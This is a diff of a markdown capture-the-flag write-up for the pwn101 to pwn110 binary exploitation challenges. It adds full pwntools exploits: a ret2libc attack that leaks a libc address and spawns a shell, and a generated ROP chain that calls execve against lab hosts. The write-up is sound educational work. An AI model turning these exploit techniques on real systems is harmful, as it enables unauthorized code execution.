@@ -17,7 +17,7 @@ The goal of this task was simply to overflow the buffer, I found that 100 charac
     p.interactive()
 ![image](https://github.com/user-attachments/assets/2e84d354-224c-4fa8-b4b9-86305ffa26e5)<br />
 
-### Challenge 2 - pwn101
+### Challenge 2 - pwn102
 Let's disassemble the binary in IDA:<br />
 ![image](https://github.com/user-attachments/assets/29a5aca3-d0a8-45cb-b047-ef27bc06936c)<br />
 There's a buffer stored at rbp+var_70, and `var_70` is at -70h, which is 112 bytes from the beginning of the stack. Then, var_8 is at -8h, and var_4 is at -4h. To overwrite var_8 and var_4 I need an offset of 112 - 8 = 104 bytes. Then I need to overwrite these two variables with the values provided by the program.<br />
@@ -42,7 +42,7 @@ So I developed the following pwntools exploit:
 `pack("<I", 0x0C0D3)` outputs the address in little endian format:<br />
 ![image](https://github.com/user-attachments/assets/4910ea60-6ed6-4121-90f0-d7daad62cea0)<br />
 
-### Challenge 3 - pwn101
+### Challenge 3 - pwn103
 If I look at the binary with pwngdb, I can see that there's a function called `admins_only`:<br />
 ![image](https://github.com/user-attachments/assets/f0727e08-4d5a-4075-9a39-88c2bb520966)<br />
 And this is the content of that function.<br />
@@ -82,7 +82,7 @@ The offset is 40 bytes. So I developed the following exploit:<br />
 This code first sends the command `3`, and then sends the payload. Notice that I had to add a `ret` gadget because of stack alignment issues.<br />
 ![image](https://github.com/user-attachments/assets/31ffefbd-edd5-4b2d-ab65-04c08259206e)<br />
 
-### Challenge 4 - pwn101
+### Challenge 4 - pwn104
 The program behaves like this: <br />
 ![image](https://github.com/user-attachments/assets/d614f503-2876-4121-9ae3-e52dc651ce58)<br />
 Looking at the binary, it doesn't seem to contain any vulnerable function:<br />
@@ -148,7 +148,7 @@ But it's not important. Since the program leaks the address of the buffer, I can
 Here I'm abusing the fact that even if the offset is at 88, the `read` function reads 200 bytes, so I can actually use that extra space to put my shellcode. So I add 88 bytes of "A"s, and then put some NOPs and then the shellcode, and then I jump to the NOP sled, which is the address of the buffer + something, I opted for 20.<br />
 ![image](https://github.com/user-attachments/assets/2fc2725f-5407-4e6a-b20a-07cc17a8b5bf)<br />
 
-### Challenge 5 - pwn101
+### Challenge 5 - pwn105
 The first part of the binary takes two user inputs and sums them:<br />
 ![Screenshot 2025-03-21 093933](https://github.com/user-attachments/assets/21c3081b-28ca-472f-96a1-e5634bb517f3)<br />
 Then:<br />
@@ -160,7 +160,7 @@ In that case it exits. But if the sign of the sum is positive, then it just prin
 So now I just need to do the same thing on the remote host:<br />
 ![Screenshot 2025-03-21 095221](https://github.com/user-attachments/assets/f2c98059-fe0c-417b-903f-f0d9f328752f)<br />
 
-### Challenge 6 - pwn101
+### Challenge 6 - pwn106
 Here's what the binary does:<br />
 ![image](https://github.com/user-attachments/assets/e8c747cd-9a24-4e6f-9704-34263d9e23ea)<br />
 It takes user input and then calles `printf`, but without specifying any format. This allows user to send a payload of `%p`, which can be used to print values from the stack. That is because `%p` takes a value and prints it in hex, this means that my payload is going to take values from the stack itself and print them in hex.<br />
@@ -185,7 +185,7 @@ So now I take this bytes and try to hex-decode them on cyberchef:<br />
 As you can see the flag is in there, it's a bit drunk but it's there lol, probably because I need to convert it in little endian.<br />
 I simply asked chatGPT to do that for me, and that's how I got the flag.
 
-### Challenge 7 - pwn101
+### Challenge 7 - pwn107
 This is how the program behaves:<br />
 ![Screenshot 2025-03-21 114528](https://github.com/user-attachments/assets/93232cd5-bf4b-48e3-aaf8-3d903b04c958)<br />
 It takes two inputs from the user.<br />
@@ -284,7 +284,7 @@ But for some reason it doesn't exploit the remote binary.. There must be some di
 
 ![Screenshot 2025-03-21 171016](https://github.com/user-attachments/assets/d264a3c5-013f-4f40-b291-1b308be6e913)<br />
 
-### Challenge 8 - pwn101
+### Challenge 8 - pwn108
 This is how it behaves (I already tried with a format string payload xd):<br />
 ![image](https://github.com/user-attachments/assets/2fa95067-65be-47e6-97e6-260203c2c565)<br />
 So it takes two user inputs, but this time only the second one is vulnerable to format string... The good new is that there's no ASLR active:<br />
@@ -330,7 +330,244 @@ At the stack value number 10, it starts to write hex values of `%` and `%p`. On 
 ![image](https://github.com/user-attachments/assets/cc63b353-475b-4f43-9da1-e14e1656275e)<br />
 Note that this exploit can only be done because the binary is only PARTIAL RELRO, meaning that the GOT can be changed during execution.
 
+### Challenge 9 - pwn109
+The binary has the following defenses:<br />
+![image](https://github.com/user-attachments/assets/110240fb-96a0-4648-aea3-b07aebfbbb54)<br />
+Also, analysis with IDA doesn't show any "win" function to jump to. Next, I use the following code to find the offset:
 
-### Challenge 8 - pwn101
+    from pwn import *
+    
+    io = process('./pwn109-1644300507645.pwn109')
+    #print(io.recvregex(b'\n')) # read until we get the prompt
+    io.recvline()
+    io.sendline(cyclic(3000))
+    io.wait()
+    core = io.corefile
+    stack = core.rsp
+    info("rsp = %#x", stack)
+    pattern = core.read(stack, 4)
+    rip_offset = cyclic_find(pattern)
+    info("rip offset is %d", rip_offset)
+![image](https://github.com/user-attachments/assets/188f2c62-169a-4c9b-9d8a-e02011d8d07a)<br />
+Which is `40` bytes. How to exploit this? I believe this is a perfect case for a `ret2libc` attack. By leaking the libc base address via plt/got (running main twice) we can do a ret2libc attack and execute system("/bin/sh").
 
-### Challenge 10 - pwn101
+    from pwn import *
+    
+    elf = context.binary = ELF("./pwn109-1644300507645.pwn109")
+    
+    p = process()
+    
+    rop = ROP(elf)
+    rop = ROP(elf)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
+    ret_chain = [ret, ret, ret, ret, ret, ret]        # chain of 3 rets
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main = elf.sym['main']
+    
+    log.info(f'pop rdi: {hex(pop_rdi)}')
+    log.info(f'puts@plt: {hex(puts_plt)}')
+    log.info(f'puts@got: {hex(puts_got)}')
+    log.info(f'main: {hex(main)}')
+    
+    offset = 40
+    
+    payload1 = flat(
+        b'A' * offset,
+        ret,
+        pop_rdi,
+        puts_got,
+        puts_plt,
+        main
+    )
+    
+    p.sendline(payload1)
+    
+    p.recvline()
+    
+    p.interactive()
+The code above will call the function puts in order to print the the address of the `puts` function inside the GOT table. Then, it will call `main` again so that we can use the leaked address of puts to compute the addresses of `system` and of `"/bin/sh"` and send them on the second payload. So the final payload to exploit the remote machine is this:
+
+    from pwn import *
+    
+    elf = context.binary = ELF("./pwn109-1644300507645.pwn109")
+    libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
+    
+        ip = "10.10.157.47"
+        port = 9009
+        
+        p = remote(ip,port)
+        #p = process()
+        
+        rop = ROP(elf)
+        rop = ROP(elf)
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+        ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
+        puts_plt = elf.plt['puts']
+        puts_got = elf.got['puts']
+        main = elf.sym['main']
+        
+        log.info(f'pop rdi: {hex(pop_rdi)}')
+        log.info(f'puts@plt: {hex(puts_plt)}')
+        log.info(f'puts@got: {hex(puts_got)}')
+        log.info(f'main: {hex(main)}')
+        
+        offset = 40
+        
+        payload1 = flat(
+            b'A' * offset,
+            ret,
+            pop_rdi,
+            puts_got,
+            puts_plt,
+            main
+        )
+        
+        p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
+        p.recvline()
+        
+        p.sendline(payload1)
+        
+        puts_leak = u64(p.recv(6) + b'\x00\x00')
+        log.success(f'Leaked puts@libc: {hex(puts_leak)}')
+        
+        libc_base = puts_leak - libc.symbols['puts']
+        system = libc_base + libc.symbols['system']
+        bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+        
+        log.success(f'libc base: {hex(libc_base)}')
+        log.success(f'system: {hex(system)}')
+        log.success(f'/bin/sh: {hex(bin_sh)}')
+        
+        payload2 = flat(
+            b'A' * offset,
+            ret,
+            ret,
+            pop_rdi,
+            bin_sh,
+            system
+        )
+        
+        p.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
+        p.recvline()
+        
+        p.sendline(payload2)
+        
+        p.interactive()
+Notice that I added 2 `ret` gadgets because the hint says so ahah it has probably something to do with a defense mechanism that I still have to study. Also, notice that the address of the libc library changes for the remote system. How did I find that? I used [this website](https://libc.rip/) in which you input the name of the function and the address that you leaked, and it lists all the libc versions that are compatible with it. <br />
+![image](https://github.com/user-attachments/assets/25a47e47-3eda-47c1-96e2-eb8a81aa0962)<br />
+So I basically started to try all of them until I found the right one.(you have to download it from the same site and put it in the directory containing the script)<br />
+![image](https://github.com/user-attachments/assets/36075aad-9592-4540-af84-76eefbd0961a)<br />
+
+### Challenge 10 - pwn110
+![image](https://github.com/user-attachments/assets/97e02be0-b639-4745-8590-b9e5b7764428)<br />
+These are the security measures in place:<br />
+![image](https://github.com/user-attachments/assets/0d24141b-9f15-4d9b-ab39-45383005872e)<br />
+How ever the stack canary doesn't seem to be in place, for some reason I can still get a segmentation fault:<br />
+![image](https://github.com/user-attachments/assets/570293a9-b797-4e04-b0bc-dd13aa847803)<br />
+Well, no complaints from my behalf.<br />
+Again the offset is `40` bytes. 
+But this time the binary is different:<br />
+![image](https://github.com/user-attachments/assets/6a1a6518-879e-4149-a130-760373ba8b0f)<br />
+As you can see, the binary is statically linked, this means that the libc is hardcoded into the .text section of the binary itself! ok now you might ask: how do I find system and "/bin/sh" inside the binary? None of them is in the binary. So the idea is to put "/bin/sh" into the buffer itself, and then do a syscall 59 (execve), that takes our buffer as input. Luckily for me, there's a tool that does this for me automatically. I just need to run `ROPgadget --binary pwn110-1644300525386.pwn110 --ropchain` and it will look for gadgets in the binary and output a payload to put inside my pwntools script, in order to spawn a shell. The final code I used for this exploit is:
+
+    from pwn import *
+    from struct import pack
+    
+    elf = context.binary = ELF("./pwn110-1644300525386.pwn110")
+    
+    ip = "10.10.130.113"
+    port = 9010
+    
+    proc = remote(ip,port)
+    
+    #proc = process()
+    # Padding goes here
+    p = b'A'*40
+    
+    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
+    p += pack('<Q', 0x00000000004c00e0) # @ .data
+    p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
+    p += b'/bin//sh'
+    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
+    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
+    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
+    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
+    p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
+    p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
+    p += pack('<Q', 0x00000000004c00e0) # @ .data
+    p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
+    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
+    p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
+    p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
+    p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
+    p += pack('<Q', 0x00000000004012d3) # syscall
+    
+    proc.sendline(p)
+    proc.interactive()
+
+<br />
+![Screenshot 2025-03-22 191917](https://github.com/user-attachments/assets/187d7d79-29c0-4ed4-bb98-f69355a3692a)
+
+
+
